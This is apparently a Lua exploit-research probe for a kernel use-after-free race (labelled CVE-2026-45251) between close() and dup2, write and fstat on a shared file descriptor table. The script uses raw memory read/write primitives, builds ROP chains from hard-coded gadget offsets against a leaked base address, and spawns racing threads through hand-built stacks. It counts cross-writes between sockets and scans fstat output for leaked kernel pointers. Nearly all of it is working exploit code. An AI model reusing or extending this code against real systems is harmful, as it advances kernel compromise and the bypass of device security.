-- CRASH_CLASS: MODERATE
-- PROBE 93e5: close vs dup2/write race on shared fd table
--
-- CVE-2026-45251 core: race between close() dropping the file reference
-- and another operation (dup2, write, fstat) that holds a stale pointer.
-- Child threads share the fd table, so close(fd) in one thread while
-- another thread is mid-dup2/write/fstat on the same fd can hit the UAF.
--
-- Strategy: two child threads racing:
--   Thread A: write(fd, buf, len) in a tight loop (via ROP)
--   Thread B: close(fd) then immediately reopen with socket()
-- If thread A's write() uses the stale file pointer after close+reopen,
-- it writes to the WRONG object (type confusion / UAF).

print("=== PROBE 93e5: CLOSE vs DUP2/WRITE RACE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function split(val)
    if val == nil then return 0, 0 end
    if type(val) == "number" then
        if val < 0 then val = val + 0x100000000 end
        if val >= 0x100000000 then
            local hi = math.floor(val / 0x100000000)
            return val - hi * 0x100000000, hi
        end
        return val, 0
    end
    if type(val) == "table" and val.h then
        local h, l = val.h, val.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return l, h
    end
    return 0, 0
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local sa = memory.alloc(32); wq(N(sa), uint64(1))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

local ib = memory.alloc(0x200); wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local function eoff(off)
    local lo = elo + off; local hi = ehi
    if lo >= 0x100000000 then hi = hi + 1; lo = lo - 0x100000000 end
    return lo, hi
end

local par_lo, par_hi = eoff(0x992)
local pdr_lo, pdr_hi = eoff(0xC9DFE)
local psr_lo, psr_hi = eoff(0xD77D)
local prdx_lo, prdx_hi = eoff(0x3B02D7)
local prc_lo, prc_hi = eoff(0xE64)
local pr8_lo, pr8_hi = eoff(0x991)
local bret_lo, bret_hi = eoff(0x42)
local mwr_lo, mwr_hi = eoff(0x92C67)
local stub_lo, stub_hi = split(stub)

local function spawn_child(calls, done_addr)
    local tcb = memory.alloc(0x1000)
    local tcb_a = N(tcb); local tcb_lo, tcb_hi = split(tcb)
    for i = 0, 0xFF8, 8 do wd(tcb_a + i, tcb_lo); wd(tcb_a + i + 4, tcb_hi) end
    local fs_ptr = memory.alloc(8)
    wd(N(fs_ptr), tcb_lo); wd(N(fs_ptr) + 4, tcb_hi)
    local fsptr_lo, fsptr_hi = split(N(fs_ptr))
    local done_lo, done_hi = split(done_addr)
    local stk = memory.alloc(0x200000)
    local sb = N(stk); local ss = 0x100000
    local rsp = sb + ss - ((sb + ss) % 16) - 8
    local pos = 0
    local function put(lo, hi) wd(rsp + pos*8, lo); wd(rsp + pos*8 + 4, hi or 0); pos = pos + 1 end
    put(pdr_lo, pdr_hi); put(129, 0)
    put(psr_lo, psr_hi); put(fsptr_lo, fsptr_hi)
    put(par_lo, par_hi); put(165, 0)
    put(stub_lo, stub_hi)
    for _, c in ipairs(calls) do
        if #c >= 2 then put(pdr_lo, pdr_hi); local l,h = split(c[2]); put(l, h) end
        if #c >= 3 then put(psr_lo, psr_hi); local l,h = split(c[3]); put(l, h) end
        if #c >= 4 then put(prdx_lo, prdx_hi); local l,h = split(c[4]); put(l, h) end
        if #c >= 5 then put(prc_lo, prc_hi); local l,h = split(c[5]); put(l, h) end
        if #c >= 6 then put(pr8_lo, pr8_hi); local l,h = split(c[6]); put(l, h) end
        put(par_lo, par_hi); put(c[1], 0)
        put(stub_lo, stub_hi)
    end
    put(par_lo, par_hi); put(0xD09E93E5, 0)
    put(pdr_lo, pdr_hi); put(done_lo, done_hi)
    put(mwr_lo, mwr_hi)
    put(pdr_lo, pdr_hi); put(0, 0)
    put(par_lo, par_hi); put(431, 0)
    put(stub_lo, stub_hi)
    local par = memory.alloc(0x40); local pa = N(par)
    for i = 0, 0x3C, 4 do wd(pa + i, 0) end
    wq(pa, uint64(string.format("0x%X%08X", bret_hi, bret_lo)))
    wq(pa + 8, uint64(0))
    wq(pa + 0x10, uint64(sb)); wq(pa + 0x18, uint64(ss))
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(pa + 0x30, tid)
    local ok1, rv1 = pcall(function() return mk(455)(par, uint64(0x38)) end)
    return ok1 and N(rv1) == 0
end

-- ======== SECTION A: close(fd) from child vs dup2(spare, fd) from main ========
-- dup2(oldfd, newfd) atomically closes newfd and duplicates oldfd into it.
-- If child's close(fd) races with main's dup2(spare, fd), the fd table
-- entry may be freed while dup2 is installing the new file pointer.
print("--- Section A: close vs dup2 race ---")

local dup2_anomalies = 0
for iter = 1, 20 do
    if not alive() then print("DEAD at iter " .. iter); break end

    -- Create two socketpairs: one as the target, one as spare
    local sv1 = memory.alloc(16); wd(N(sv1), 0); wd(N(sv1)+4, 0)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), sv1) end)
    local fd0 = rd(N(sv1)) or -1; local fd1 = rd(N(sv1)+4) or -1

    local sv2 = memory.alloc(16); wd(N(sv2), 0); wd(N(sv2)+4, 0)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), sv2) end)
    local spare0 = rd(N(sv2)) or -1; local spare1 = rd(N(sv2)+4) or -1

    if fd0 < 0 or spare0 < 0 then print("socketpair failed"); break end

    local done = memory.alloc(8); wd(N(done), 0)
    -- Child: close(fd0)
    local spawned = spawn_child({{6, fd0}}, N(done))

    if spawned then
        -- Main: dup2(spare0, fd0) - tries to install spare0 into fd0's slot
        local ok_d, rv_d = pcall(function()
            return mk(90)(uint64(spare0), uint64(fd0))
        end)
        local dup2_ret = ok_d and N(rv_d) or -999
        if dup2_ret >= 0x80000000 then dup2_ret = dup2_ret - 0x100000000 end

        for w = 1, 100000 do if (rd(N(done)) or 0) ~= 0 then break end end

        -- Check: write to fd0 should go to spare0's peer (spare1)
        -- If dup2 won the race, fd0 now points to spare0's file
        -- If close won, fd0 is gone and dup2 installs spare0 as fd0
        local wbuf = memory.alloc(8); wd(N(wbuf), 0xCAFE0000 + iter)
        local ok_w, rv_w = pcall(function()
            return mk(4)(uint64(fd0), uint64(N(wbuf)), uint64(4))
        end)
        local write_ret = ok_w and N(rv_w) or -999
        if write_ret >= 0x80000000 then write_ret = write_ret - 0x100000000 end

        -- Try reading from spare1 (should get data if dup2 succeeded)
        local rbuf = memory.alloc(8); wd(N(rbuf), 0xDEADDEAD)
        local ok_r, rv_r = pcall(function()
            return mk(3)(uint64(spare1), uint64(N(rbuf)), uint64(4))
        end)
        local read_ret = ok_r and N(rv_r) or -999
        local read_val = rd(N(rbuf)) or 0

        -- Also try reading from fd1 (the original peer of fd0)
        local rbuf2 = memory.alloc(8); wd(N(rbuf2), 0xBEEFBEEF)
        local ok_r2, rv_r2 = pcall(function()
            return mk(3)(uint64(fd1), uint64(N(rbuf2)), uint64(4))
        end)
        local read2_ret = ok_r2 and N(rv_r2) or -999
        local read2_val = rd(N(rbuf2)) or 0

        if write_ret < 0 then
            -- fd0 is dead (both close and dup2 failed to keep it)
            -- This is unexpected if dup2 should have reinstalled it
            dup2_anomalies = dup2_anomalies + 1
            print(string.format("  iter %d: dup2=%d write=%d ANOMALY (fd dead)",
                iter, dup2_ret, write_ret))
        elseif read_val == (0xCAFE0000 + iter) then
            -- Data went to spare1 = dup2 succeeded, fd0 -> spare0's file
            -- This is normal
        elseif read2_val == (0xCAFE0000 + iter) then
            -- Data went to fd1 = original socket still alive
            -- close didn't take effect, or dup2 reinstalled the same object
        else
            dup2_anomalies = dup2_anomalies + 1
            print(string.format("  iter %d: dup2=%d w=%d r_spare=0x%X r_orig=0x%X CROSS-WRITE?",
                iter, dup2_ret, write_ret, read_val, read2_val))
        end
    end

    pcall(function() mk(6)(uint64(fd0)) end)
    pcall(function() mk(6)(uint64(fd1)) end)
    pcall(function() mk(6)(uint64(spare0)) end)
    pcall(function() mk(6)(uint64(spare1)) end)
end

print(string.format("dup2_races=20 anomalies=%d", dup2_anomalies))

-- ======== SECTION B: two children racing close vs write on same fd ========
-- Thread A: write(fd0, marker, 8) x5 (ROP loop)
-- Thread B: close(fd0) then socket() to reuse slot
-- If write happens after close+reuse, data goes to the wrong object
print("")
print("--- Section B: child write vs child close+reopen ---")

local cross_writes = 0
for iter = 1, 15 do
    if not alive() then print("DEAD at iter " .. iter); break end

    local sv = memory.alloc(16); wd(N(sv), 0); wd(N(sv)+4, 0)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), sv) end)
    local fd0 = rd(N(sv)) or -1; local fd1 = rd(N(sv)+4) or -1
    if fd0 < 0 then break end

    -- Create a second socketpair for the reuse target
    local sv2 = memory.alloc(16); wd(N(sv2), 0); wd(N(sv2)+4, 0)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), sv2) end)
    local new0 = rd(N(sv2)) or -1; local new1 = rd(N(sv2)+4) or -1

    local wbuf = memory.alloc(16)
    wd(N(wbuf), 0xBAAD0000 + iter)
    wd(N(wbuf)+4, 0)

    local done_a = memory.alloc(8); wd(N(done_a), 0)
    local done_b = memory.alloc(8); wd(N(done_b), 0)

    -- Thread A: write to fd0 five times
    local calls_a = {}
    for j = 1, 5 do
        table.insert(calls_a, {4, fd0, N(wbuf), 4})  -- write(fd0, wbuf, 4)
    end
    local spawned_a = spawn_child(calls_a, N(done_a))

    -- Thread B: close fd0, dup2(new0, fd0) to reuse slot with different socket
    local calls_b = {
        {6, fd0},              -- close(fd0)
        {90, new0, fd0},       -- dup2(new0, fd0) -> fd0 now points to new0's file
    }
    local spawned_b = spawn_child(calls_b, N(done_b))

    -- Wait for both
    for w = 1, 200000 do
        local da = rd(N(done_a)) or 0
        local db = rd(N(done_b)) or 0
        if da ~= 0 and db ~= 0 then break end
    end

    -- Check: did any data arrive on new1 (the peer of new0)?
    -- If so, thread A's write went to the WRONG socket (cross-type write)
    local check_buf = memory.alloc(8); wd(N(check_buf), 0)
    -- Set socket to non-blocking first
    local nb = memory.alloc(4); wd(N(nb), 1)
    pcall(function() mk(54)(uint64(new1), uint64(0x8004667E), uint64(N(nb))) end)  -- FIONBIO

    local ok_r, rv_r = pcall(function()
        return mk(3)(uint64(new1), uint64(N(check_buf)), uint64(4))
    end)
    local r_ret = ok_r and N(rv_r) or -999
    if r_ret >= 0x80000000 then r_ret = r_ret - 0x100000000 end
    local r_val = rd(N(check_buf)) or 0

    if r_ret > 0 and r_val == (0xBAAD0000 + iter) then
        cross_writes = cross_writes + 1
        print(string.format("  iter %d: CROSS-WRITE! data=0x%08X on wrong socket", iter, r_val))
    elseif r_ret > 0 then
        cross_writes = cross_writes + 1
        print(string.format("  iter %d: UNEXPECTED DATA on new1: ret=%d val=0x%08X", iter, r_ret, r_val))
    end

    -- Also check fd1 (original peer)
    pcall(function() mk(54)(uint64(fd1), uint64(0x8004667E), uint64(N(nb))) end)
    local ok_r2, rv_r2 = pcall(function()
        return mk(3)(uint64(fd1), uint64(N(check_buf)), uint64(4))
    end)
    local r2_ret = ok_r2 and N(rv_r2) or -999
    if r2_ret >= 0x80000000 then r2_ret = r2_ret - 0x100000000 end

    pcall(function() mk(6)(uint64(fd0)) end)
    pcall(function() mk(6)(uint64(fd1)) end)
    pcall(function() mk(6)(uint64(new0)) end)
    pcall(function() mk(6)(uint64(new1)) end)
end

print(string.format("write_races=15 cross_writes=%d", cross_writes))

-- ======== SECTION C: fstat during close race - kernel stack residue? ========
print("")
print("--- Section C: fstat vs close race ---")

local fstat_leaks = 0
for iter = 1, 20 do
    if not alive() then print("DEAD at iter " .. iter); break end

    local sv = memory.alloc(16); wd(N(sv), 0); wd(N(sv)+4, 0)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), sv) end)
    local fd0 = rd(N(sv)) or -1; local fd1 = rd(N(sv)+4) or -1
    if fd0 < 0 then break end

    local done = memory.alloc(8); wd(N(done), 0)
    local spawned = spawn_child({{6, fd0}}, N(done))

    if spawned then
        -- Main: fstat(fd0) immediately after child spawns
        local statbuf = memory.alloc(256)
        for j = 0, 252, 4 do wd(N(statbuf)+j, 0xDEAD0000+j) end

        local ok_f, rv_f = pcall(function()
            return mk(189)(uint64(fd0), uint64(N(statbuf)))
        end)
        local fstat_ret = ok_f and N(rv_f) or -999
        if fstat_ret >= 0x80000000 then fstat_ret = fstat_ret - 0x100000000 end

        for w = 1, 100000 do if (rd(N(done)) or 0) ~= 0 then break end end

        -- Scan statbuf for kernel pointers
        if fstat_ret == 0 then
            for j = 0, 120, 4 do
                local lo = rd(N(statbuf)+j) or 0
                local hi = rd(N(statbuf)+j+4) or 0
                if lo < 0 then lo = lo + 0x100000000 end
                if hi < 0 then hi = hi + 0x100000000 end
                if hi >= 0xFFFF8000 and hi < 0xFFFFFF00 then
                    fstat_leaks = fstat_leaks + 1
                    print(string.format("  iter %d +%02X: KPTR 0x%08X%08X", iter, j, hi, lo))
                end
            end
        end
    end

    pcall(function() mk(6)(uint64(fd1)) end)
end

print(string.format("fstat_races=20 kptr_leaks=%d", fstat_leaks))

print("")
print("alive=" .. tostring(alive()))
print("=== 93e5 COMPLETE ===")
